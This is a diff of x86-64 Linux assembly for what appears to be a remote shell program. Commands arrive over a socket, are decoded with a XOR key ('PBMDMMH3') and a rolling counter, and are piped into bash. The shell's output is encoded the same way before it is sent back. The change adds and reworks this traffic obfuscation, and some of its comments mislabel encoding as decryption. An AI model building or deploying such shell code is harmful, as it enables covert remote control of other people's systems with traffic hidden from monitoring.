@@ -65,24 +65,18 @@ _start:
 ;call _echo
 
 _recv_thread:
-    xor rbx, rbx
+    mov rbx, 1      ; set counter to 1
 
-    mov rax, 57 ; SYS_FORK Op Code
+    mov rax, 57     ; SYS_FORK Op Code
     syscall
 
-	test rax, rax  ;If the return value is 0, we are in the child process
+	test rax, rax  ; If the return value is 0, we are in the child process
 	jz .readloop
 
     ret
 
     .readloop:
-    ;   50424d444d4d4833
-        ;push qword 0x33484d4d444d4250   ; IV = PBMDMMH3
-        cmp rbx, 8
-        je .donotresetcounter
-            mov rcx, 1
-        .donotresetcounter:
-        mov r10, rcx
+
         ;           SYS_READ
         xor     rax, rax          ; SYS_READ rax = 0
         mov     rdi, r9           ; client socket fd
@@ -90,26 +84,26 @@ _recv_thread:
         mov     rdx, 8            ; read 8 bytes 
         syscall
 
-        mov rcx, r10
+        mov rcx, rax               ; save number of bytes read
 
-        mov rbx, rax
+        ; decrypt buffer
         ; IV = PBMDMMH3
-        xor byte [r15], 0x50
-        sub byte [r15], cl
-        xor byte [r15 + 1], 0x42
-        sub byte [r15 + 1], cl
-        xor byte [r15 + 2], 0x4d
-        sub byte [r15 + 2], cl
-        xor byte [r15 + 3], 0x44
-        sub byte [r15 + 3], cl
-        xor byte [r15 + 4], 0x4d
-        sub byte [r15 + 4], cl
-        xor byte [r15 + 5], 0x4d
-        sub byte [r15 + 5], cl
-        xor byte [r15 + 6], 0x48
-        sub byte [r15 + 6], cl
-        xor byte [r15 + 7], 0x33
-        sub byte [r15 + 7], cl
+        xor byte [r15], 0x50      ; xor P to 1th byte
+        sub byte [r15], bl        ; sub counter to 1th byte
+        xor byte [r15 + 1], 0x42  ; xor B to 2th byte
+        sub byte [r15 + 1], bl    ; sub counter to 2th byte
+        xor byte [r15 + 2], 0x4d  ; xor M to 3th byte
+        sub byte [r15 + 2], bl    ; sub counter to 3th byte
+        xor byte [r15 + 3], 0x44  ; xor D to 4th byte
+        sub byte [r15 + 3], bl    ; sub counter to 4th byte
+        xor byte [r15 + 4], 0x4d  ; xor M to 5th byte
+        sub byte [r15 + 4], bl    ; sub counter to 5th byte
+        xor byte [r15 + 5], 0x4d  ; xor M to 6th byte
+        sub byte [r15 + 5], bl    ; sub counter to 6th byte
+        xor byte [r15 + 6], 0x48  ; xor H to 7th byte
+        sub byte [r15 + 6], bl    ; sub counter to 7th byte
+        xor byte [r15 + 7], 0x33  ; xor 3 to 8th byte
+        sub byte [r15 + 7], bl    ; sub counter to 8th byte
 
         ;           SYS_WRITE
         xor     rdi, rdi
@@ -117,20 +111,17 @@ _recv_thread:
         mov     edi, [r13+2]      ; pipe write side
         ror     rdi, 16           ; roll right 16 bits
         mov     rsi, r15          ; buffer
-        mov     rdx, rbx          ; number of bytes received in _read
+        mov     rdx, rcx          ; number of bytes received in _read
         syscall
 
-        mov rcx, r10
-
-        xor rax, rax
-        mov al, cl
-        inc rax
-        cmp rax, 256
-        je .donotinccounter
-            inc cl
+        mov rcx, rbx
+        inc cx                    ; increment counter
+        cmp cx, 130               ; if next counter increment is equal to 130
+        je .donotinccounter       ; then jump to reset the counter to 1
+            inc bl
             jmp .readloop
         .donotinccounter:
-        mov rcx, 1
+        mov rbx, 1                ; reset counter to 1
         jmp .readloop
 
 
@@ -185,6 +176,9 @@ _bash_thread:
     syscall
 
 _send_command:
+
+    mov rbx, 1      ; set counter to 1
+
     .readloop:
         ;           SYS_READ
         xor     rax, rax          ; SYS_READ rax = 0
@@ -194,16 +188,40 @@ _send_command:
         mov     rdx, 8            ; read 8 bytes 
         syscall
 
-        mov rbx, rax              ; save bytes read
+        mov rcx, rax              ; save bytes read
+
+        ; decrypt buffer
+        ; IV = PBMDMMH3
+        add byte [r14], bl        ; sub counter to 1th byte
+        xor byte [r14], 0x50      ; xor P to 1th byte
+        add byte [r14 + 1], bl    ; sub counter to 2th byte
+        xor byte [r14 + 1], 0x42  ; xor B to 2th byte
+        add byte [r14 + 2], bl    ; sub counter to 3th byte
+        xor byte [r14 + 2], 0x4d  ; xor M to 3th byte
+        add byte [r14 + 3], bl    ; sub counter to 4th byte
+        xor byte [r14 + 3], 0x44  ; xor D to 4th byte
+        add byte [r14 + 4], bl    ; sub counter to 5th byte
+        xor byte [r14 + 4], 0x4d  ; xor M to 5th byte
+        add byte [r14 + 5], bl    ; sub counter to 6th byte
+        xor byte [r14 + 5], 0x4d  ; xor M to 6th byte
+        add byte [r14 + 6], bl    ; sub counter to 7th byte
+        xor byte [r14 + 6], 0x48  ; xor H to 7th byte
+        add byte [r14 + 7], bl    ; sub counter to 8th byte
+        xor byte [r14 + 7], 0x33  ; xor 3 to 8th byte
 
         ;           SYS_WRITE
         mov     rax, 1            ; SYS_WRITE rax = 1
         mov     rdi, r9           ; socket
         mov     rsi, r14          ; buffer
-        mov     rdx, rbx          ; number of bytes received in _read
+        mov     rdx, rcx          ; number of bytes received in _read
         syscall
 
+        mov rcx, rbx
+        inc cx                    ; increment counter
+        cmp cx, 130               ; if next counter increment is equal to 130
+        je .donotinccounter       ; then jump to reset the counter to 1
+            inc bl
+            jmp .readloop
+        .donotinccounter:
+        mov rbx, 1                ; reset counter to 1
         jmp .readloop
-
-; abcdefghijklmnop
-; al- sl
